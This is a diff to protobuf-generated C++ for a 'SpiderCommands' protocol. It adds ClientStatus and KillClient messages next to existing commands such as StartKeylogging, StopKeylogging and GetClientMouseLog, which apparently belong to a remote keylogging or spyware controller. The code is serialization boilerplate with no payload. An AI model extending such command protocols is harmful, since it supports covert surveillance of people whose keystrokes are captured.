@@ -2,7 +2,7 @@
 // source: Proto/SpiderCommands.proto
 
 #define INTERNAL_SUPPRESS_PROTOBUF_FIELD_DEPRECATION
-#include "Proto/SpiderCommands.pb.h"
+#include "SpiderCommands.pb.h"
 
 #include <algorithm>
 
@@ -40,6 +40,12 @@ const ::google::protobuf::internal::GeneratedMessageReflection*
 const ::google::protobuf::Descriptor* SetClientDelay_descriptor_ = NULL;
 const ::google::protobuf::internal::GeneratedMessageReflection*
   SetClientDelay_reflection_ = NULL;
+const ::google::protobuf::Descriptor* ClientStatus_descriptor_ = NULL;
+const ::google::protobuf::internal::GeneratedMessageReflection*
+  ClientStatus_reflection_ = NULL;
+const ::google::protobuf::Descriptor* KillClient_descriptor_ = NULL;
+const ::google::protobuf::internal::GeneratedMessageReflection*
+  KillClient_reflection_ = NULL;
 
 }  // namespace
 
@@ -145,6 +151,32 @@ void protobuf_AssignDesc_Proto_2fSpiderCommands_2eproto() {
       -1,
       sizeof(SetClientDelay),
       GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(SetClientDelay, _internal_metadata_));
+  ClientStatus_descriptor_ = file->message_type(7);
+  static const int ClientStatus_offsets_[1] = {
+  };
+  ClientStatus_reflection_ =
+    ::google::protobuf::internal::GeneratedMessageReflection::NewGeneratedMessageReflection(
+      ClientStatus_descriptor_,
+      ClientStatus::internal_default_instance(),
+      ClientStatus_offsets_,
+      -1,
+      -1,
+      -1,
+      sizeof(ClientStatus),
+      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(ClientStatus, _internal_metadata_));
+  KillClient_descriptor_ = file->message_type(8);
+  static const int KillClient_offsets_[1] = {
+  };
+  KillClient_reflection_ =
+    ::google::protobuf::internal::GeneratedMessageReflection::NewGeneratedMessageReflection(
+      KillClient_descriptor_,
+      KillClient::internal_default_instance(),
+      KillClient_offsets_,
+      -1,
+      -1,
+      -1,
+      sizeof(KillClient),
+      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(KillClient, _internal_metadata_));
 }
 
 namespace {
@@ -172,6 +204,10 @@ void protobuf_RegisterTypes(const ::std::string&) {
       StopKeylogging_descriptor_, StopKeylogging::internal_default_instance());
   ::google::protobuf::MessageFactory::InternalRegisterGeneratedMessage(
       SetClientDelay_descriptor_, SetClientDelay::internal_default_instance());
+  ::google::protobuf::MessageFactory::InternalRegisterGeneratedMessage(
+      ClientStatus_descriptor_, ClientStatus::internal_default_instance());
+  ::google::protobuf::MessageFactory::InternalRegisterGeneratedMessage(
+      KillClient_descriptor_, KillClient::internal_default_instance());
 }
 
 }  // namespace
@@ -191,6 +227,10 @@ void protobuf_ShutdownFile_Proto_2fSpiderCommands_2eproto() {
   delete StopKeylogging_reflection_;
   SetClientDelay_default_instance_.Shutdown();
   delete SetClientDelay_reflection_;
+  ClientStatus_default_instance_.Shutdown();
+  delete ClientStatus_reflection_;
+  KillClient_default_instance_.Shutdown();
+  delete KillClient_reflection_;
 }
 
 void protobuf_InitDefaults_Proto_2fSpiderCommands_2eproto_impl() {
@@ -203,6 +243,8 @@ void protobuf_InitDefaults_Proto_2fSpiderCommands_2eproto_impl() {
   StartKeylogging_default_instance_.DefaultConstruct();
   StopKeylogging_default_instance_.DefaultConstruct();
   SetClientDelay_default_instance_.DefaultConstruct();
+  ClientStatus_default_instance_.DefaultConstruct();
+  KillClient_default_instance_.DefaultConstruct();
   GetClientLog_default_instance_.get_mutable()->InitAsDefaultInstance();
   GetClientMouseLog_default_instance_.get_mutable()->InitAsDefaultInstance();
   ClientList_default_instance_.get_mutable()->InitAsDefaultInstance();
@@ -210,6 +252,8 @@ void protobuf_InitDefaults_Proto_2fSpiderCommands_2eproto_impl() {
   StartKeylogging_default_instance_.get_mutable()->InitAsDefaultInstance();
   StopKeylogging_default_instance_.get_mutable()->InitAsDefaultInstance();
   SetClientDelay_default_instance_.get_mutable()->InitAsDefaultInstance();
+  ClientStatus_default_instance_.get_mutable()->InitAsDefaultInstance();
+  KillClient_default_instance_.get_mutable()->InitAsDefaultInstance();
 }
 
 GOOGLE_PROTOBUF_DECLARE_ONCE(protobuf_InitDefaults_Proto_2fSpiderCommands_2eproto_once_);
@@ -226,8 +270,8 @@ void protobuf_AddDesc_Proto_2fSpiderCommands_2eproto_impl() {
     "tLog\022\r\n\005limit\030\001 \001(\005\"\"\n\021GetClientMouseLog"
     "\022\r\n\005limit\030\001 \001(\005\"\014\n\nClientList\"\021\n\017GetClie"
     "ntStatus\"\021\n\017StartKeylogging\"\020\n\016StopKeylo"
-    "gging\"\037\n\016SetClientDelay\022\r\n\005delay\030\001 \001(\005b\006"
-    "proto3", 206);
+    "gging\"\037\n\016SetClientDelay\022\r\n\005delay\030\001 \001(\005\"\016"
+    "\n\014ClientStatus\"\014\n\nKillClientb\006proto3", 236);
   ::google::protobuf::MessageFactory::InternalRegisterGeneratedFile(
     "Proto/SpiderCommands.proto", &protobuf_RegisterTypes);
   ::google::protobuf::internal::OnShutdown(&protobuf_ShutdownFile_Proto_2fSpiderCommands_2eproto);
@@ -1732,6 +1776,380 @@ void SetClientDelay::set_delay(::google::protobuf::int32 value) {
 
 inline const SetClientDelay* SetClientDelay::internal_default_instance() {
   return &SetClientDelay_default_instance_.get();
+}
+#endif  // PROTOBUF_INLINE_NOT_IN_HEADERS
+
+// ===================================================================
+
+#if !defined(_MSC_VER) || _MSC_VER >= 1900
+#endif  // !defined(_MSC_VER) || _MSC_VER >= 1900
+
+ClientStatus::ClientStatus()
+  : ::google::protobuf::Message(), _internal_metadata_(NULL) {
+  if (this != internal_default_instance()) protobuf_InitDefaults_Proto_2fSpiderCommands_2eproto();
+  SharedCtor();
+  // @@protoc_insertion_point(constructor:ClientStatus)
+}
+
+void ClientStatus::InitAsDefaultInstance() {
+}
+
+ClientStatus::ClientStatus(const ClientStatus& from)
+  : ::google::protobuf::Message(),
+    _internal_metadata_(NULL) {
+  SharedCtor();
+  UnsafeMergeFrom(from);
+  // @@protoc_insertion_point(copy_constructor:ClientStatus)
+}
+
+void ClientStatus::SharedCtor() {
+  _cached_size_ = 0;
+}
+
+ClientStatus::~ClientStatus() {
+  // @@protoc_insertion_point(destructor:ClientStatus)
+  SharedDtor();
+}
+
+void ClientStatus::SharedDtor() {
+}
+
+void ClientStatus::SetCachedSize(int size) const {
+  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
+  _cached_size_ = size;
+  GOOGLE_SAFE_CONCURRENT_WRITES_END();
+}
+const ::google::protobuf::Descriptor* ClientStatus::descriptor() {
+  protobuf_AssignDescriptorsOnce();
+  return ClientStatus_descriptor_;
+}
+
+const ClientStatus& ClientStatus::default_instance() {
+  protobuf_InitDefaults_Proto_2fSpiderCommands_2eproto();
+  return *internal_default_instance();
+}
+
+::google::protobuf::internal::ExplicitlyConstructed<ClientStatus> ClientStatus_default_instance_;
+
+ClientStatus* ClientStatus::New(::google::protobuf::Arena* arena) const {
+  ClientStatus* n = new ClientStatus;
+  if (arena != NULL) {
+    arena->Own(n);
+  }
+  return n;
+}
+
+void ClientStatus::Clear() {
+// @@protoc_insertion_point(message_clear_start:ClientStatus)
+}
+
+bool ClientStatus::MergePartialFromCodedStream(
+    ::google::protobuf::io::CodedInputStream* input) {
+#define DO_(EXPRESSION) if (!GOOGLE_PREDICT_TRUE(EXPRESSION)) goto failure
+  ::google::protobuf::uint32 tag;
+  // @@protoc_insertion_point(parse_start:ClientStatus)
+  for (;;) {
+    ::std::pair< ::google::protobuf::uint32, bool> p = input->ReadTagWithCutoff(127);
+    tag = p.first;
+    if (!p.second) goto handle_unusual;
+  handle_unusual:
+    if (tag == 0 ||
+        ::google::protobuf::internal::WireFormatLite::GetTagWireType(tag) ==
+        ::google::protobuf::internal::WireFormatLite::WIRETYPE_END_GROUP) {
+      goto success;
+    }
+    DO_(::google::protobuf::internal::WireFormatLite::SkipField(input, tag));
+  }
+success:
+  // @@protoc_insertion_point(parse_success:ClientStatus)
+  return true;
+failure:
+  // @@protoc_insertion_point(parse_failure:ClientStatus)
+  return false;
+#undef DO_
+}
+
+void ClientStatus::SerializeWithCachedSizes(
+    ::google::protobuf::io::CodedOutputStream* output) const {
+  // @@protoc_insertion_point(serialize_start:ClientStatus)
+  // @@protoc_insertion_point(serialize_end:ClientStatus)
+}
+
+::google::protobuf::uint8* ClientStatus::InternalSerializeWithCachedSizesToArray(
+    bool deterministic, ::google::protobuf::uint8* target) const {
+  (void)deterministic; // Unused
+  // @@protoc_insertion_point(serialize_to_array_start:ClientStatus)
+  // @@protoc_insertion_point(serialize_to_array_end:ClientStatus)
+  return target;
+}
+
+size_t ClientStatus::ByteSizeLong() const {
+// @@protoc_insertion_point(message_byte_size_start:ClientStatus)
+  size_t total_size = 0;
+
+  int cached_size = ::google::protobuf::internal::ToCachedSize(total_size);
+  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
+  _cached_size_ = cached_size;
+  GOOGLE_SAFE_CONCURRENT_WRITES_END();
+  return total_size;
+}
+
+void ClientStatus::MergeFrom(const ::google::protobuf::Message& from) {
+// @@protoc_insertion_point(generalized_merge_from_start:ClientStatus)
+  if (GOOGLE_PREDICT_FALSE(&from == this)) MergeFromFail(__LINE__);
+  const ClientStatus* source =
+      ::google::protobuf::internal::DynamicCastToGenerated<const ClientStatus>(
+          &from);
+  if (source == NULL) {
+  // @@protoc_insertion_point(generalized_merge_from_cast_fail:ClientStatus)
+    ::google::protobuf::internal::ReflectionOps::Merge(from, this);
+  } else {
+  // @@protoc_insertion_point(generalized_merge_from_cast_success:ClientStatus)
+    UnsafeMergeFrom(*source);
+  }
+}
+
+void ClientStatus::MergeFrom(const ClientStatus& from) {
+// @@protoc_insertion_point(class_specific_merge_from_start:ClientStatus)
+  if (GOOGLE_PREDICT_TRUE(&from != this)) {
+    UnsafeMergeFrom(from);
+  } else {
+    MergeFromFail(__LINE__);
+  }
+}
+
+void ClientStatus::UnsafeMergeFrom(const ClientStatus& from) {
+  GOOGLE_DCHECK(&from != this);
+}
+
+void ClientStatus::CopyFrom(const ::google::protobuf::Message& from) {
+// @@protoc_insertion_point(generalized_copy_from_start:ClientStatus)
+  if (&from == this) return;
+  Clear();
+  MergeFrom(from);
+}
+
+void ClientStatus::CopyFrom(const ClientStatus& from) {
+// @@protoc_insertion_point(class_specific_copy_from_start:ClientStatus)
+  if (&from == this) return;
+  Clear();
+  UnsafeMergeFrom(from);
+}
+
+bool ClientStatus::IsInitialized() const {
+
+  return true;
+}
+
+void ClientStatus::Swap(ClientStatus* other) {
+  if (other == this) return;
+  InternalSwap(other);
+}
+void ClientStatus::InternalSwap(ClientStatus* other) {
+  _internal_metadata_.Swap(&other->_internal_metadata_);
+  std::swap(_cached_size_, other->_cached_size_);
+}
+
+::google::protobuf::Metadata ClientStatus::GetMetadata() const {
+  protobuf_AssignDescriptorsOnce();
+  ::google::protobuf::Metadata metadata;
+  metadata.descriptor = ClientStatus_descriptor_;
+  metadata.reflection = ClientStatus_reflection_;
+  return metadata;
+}
+
+#if PROTOBUF_INLINE_NOT_IN_HEADERS
+// ClientStatus
+
+inline const ClientStatus* ClientStatus::internal_default_instance() {
+  return &ClientStatus_default_instance_.get();
+}
+#endif  // PROTOBUF_INLINE_NOT_IN_HEADERS
+
+// ===================================================================
+
+#if !defined(_MSC_VER) || _MSC_VER >= 1900
+#endif  // !defined(_MSC_VER) || _MSC_VER >= 1900
+
+KillClient::KillClient()
+  : ::google::protobuf::Message(), _internal_metadata_(NULL) {
+  if (this != internal_default_instance()) protobuf_InitDefaults_Proto_2fSpiderCommands_2eproto();
+  SharedCtor();
+  // @@protoc_insertion_point(constructor:KillClient)
+}
+
+void KillClient::InitAsDefaultInstance() {
+}
+
+KillClient::KillClient(const KillClient& from)
+  : ::google::protobuf::Message(),
+    _internal_metadata_(NULL) {
+  SharedCtor();
+  UnsafeMergeFrom(from);
+  // @@protoc_insertion_point(copy_constructor:KillClient)
+}
+
+void KillClient::SharedCtor() {
+  _cached_size_ = 0;
+}
+
+KillClient::~KillClient() {
+  // @@protoc_insertion_point(destructor:KillClient)
+  SharedDtor();
+}
+
+void KillClient::SharedDtor() {
+}
+
+void KillClient::SetCachedSize(int size) const {
+  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
+  _cached_size_ = size;
+  GOOGLE_SAFE_CONCURRENT_WRITES_END();
+}
+const ::google::protobuf::Descriptor* KillClient::descriptor() {
+  protobuf_AssignDescriptorsOnce();
+  return KillClient_descriptor_;
+}
+
+const KillClient& KillClient::default_instance() {
+  protobuf_InitDefaults_Proto_2fSpiderCommands_2eproto();
+  return *internal_default_instance();
+}
+
+::google::protobuf::internal::ExplicitlyConstructed<KillClient> KillClient_default_instance_;
+
+KillClient* KillClient::New(::google::protobuf::Arena* arena) const {
+  KillClient* n = new KillClient;
+  if (arena != NULL) {
+    arena->Own(n);
+  }
+  return n;
+}
+
+void KillClient::Clear() {
+// @@protoc_insertion_point(message_clear_start:KillClient)
+}
+
+bool KillClient::MergePartialFromCodedStream(
+    ::google::protobuf::io::CodedInputStream* input) {
+#define DO_(EXPRESSION) if (!GOOGLE_PREDICT_TRUE(EXPRESSION)) goto failure
+  ::google::protobuf::uint32 tag;
+  // @@protoc_insertion_point(parse_start:KillClient)
+  for (;;) {
+    ::std::pair< ::google::protobuf::uint32, bool> p = input->ReadTagWithCutoff(127);
+    tag = p.first;
+    if (!p.second) goto handle_unusual;
+  handle_unusual:
+    if (tag == 0 ||
+        ::google::protobuf::internal::WireFormatLite::GetTagWireType(tag) ==
+        ::google::protobuf::internal::WireFormatLite::WIRETYPE_END_GROUP) {
+      goto success;
+    }
+    DO_(::google::protobuf::internal::WireFormatLite::SkipField(input, tag));
+  }
+success:
+  // @@protoc_insertion_point(parse_success:KillClient)
+  return true;
+failure:
+  // @@protoc_insertion_point(parse_failure:KillClient)
+  return false;
+#undef DO_
+}
+
+void KillClient::SerializeWithCachedSizes(
+    ::google::protobuf::io::CodedOutputStream* output) const {
+  // @@protoc_insertion_point(serialize_start:KillClient)
+  // @@protoc_insertion_point(serialize_end:KillClient)
+}
+
+::google::protobuf::uint8* KillClient::InternalSerializeWithCachedSizesToArray(
+    bool deterministic, ::google::protobuf::uint8* target) const {
+  (void)deterministic; // Unused
+  // @@protoc_insertion_point(serialize_to_array_start:KillClient)
+  // @@protoc_insertion_point(serialize_to_array_end:KillClient)
+  return target;
+}
+
+size_t KillClient::ByteSizeLong() const {
+// @@protoc_insertion_point(message_byte_size_start:KillClient)
+  size_t total_size = 0;
+
+  int cached_size = ::google::protobuf::internal::ToCachedSize(total_size);
+  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
+  _cached_size_ = cached_size;
+  GOOGLE_SAFE_CONCURRENT_WRITES_END();
+  return total_size;
+}
+
+void KillClient::MergeFrom(const ::google::protobuf::Message& from) {
+// @@protoc_insertion_point(generalized_merge_from_start:KillClient)
+  if (GOOGLE_PREDICT_FALSE(&from == this)) MergeFromFail(__LINE__);
+  const KillClient* source =
+      ::google::protobuf::internal::DynamicCastToGenerated<const KillClient>(
+          &from);
+  if (source == NULL) {
+  // @@protoc_insertion_point(generalized_merge_from_cast_fail:KillClient)
+    ::google::protobuf::internal::ReflectionOps::Merge(from, this);
+  } else {
+  // @@protoc_insertion_point(generalized_merge_from_cast_success:KillClient)
+    UnsafeMergeFrom(*source);
+  }
+}
+
+void KillClient::MergeFrom(const KillClient& from) {
+// @@protoc_insertion_point(class_specific_merge_from_start:KillClient)
+  if (GOOGLE_PREDICT_TRUE(&from != this)) {
+    UnsafeMergeFrom(from);
+  } else {
+    MergeFromFail(__LINE__);
+  }
+}
+
+void KillClient::UnsafeMergeFrom(const KillClient& from) {
+  GOOGLE_DCHECK(&from != this);
+}
+
+void KillClient::CopyFrom(const ::google::protobuf::Message& from) {
+// @@protoc_insertion_point(generalized_copy_from_start:KillClient)
+  if (&from == this) return;
+  Clear();
+  MergeFrom(from);
+}
+
+void KillClient::CopyFrom(const KillClient& from) {
+// @@protoc_insertion_point(class_specific_copy_from_start:KillClient)
+  if (&from == this) return;
+  Clear();
+  UnsafeMergeFrom(from);
+}
+
+bool KillClient::IsInitialized() const {
+
+  return true;
+}
+
+void KillClient::Swap(KillClient* other) {
+  if (other == this) return;
+  InternalSwap(other);
+}
+void KillClient::InternalSwap(KillClient* other) {
+  _internal_metadata_.Swap(&other->_internal_metadata_);
+  std::swap(_cached_size_, other->_cached_size_);
+}
+
+::google::protobuf::Metadata KillClient::GetMetadata() const {
+  protobuf_AssignDescriptorsOnce();
+  ::google::protobuf::Metadata metadata;
+  metadata.descriptor = KillClient_descriptor_;
+  metadata.reflection = KillClient_reflection_;
+  return metadata;
+}
+
+#if PROTOBUF_INLINE_NOT_IN_HEADERS
+// KillClient
+
+inline const KillClient* KillClient::internal_default_instance() {
+  return &KillClient_default_instance_.get();
 }
 #endif  // PROTOBUF_INLINE_NOT_IN_HEADERS
 
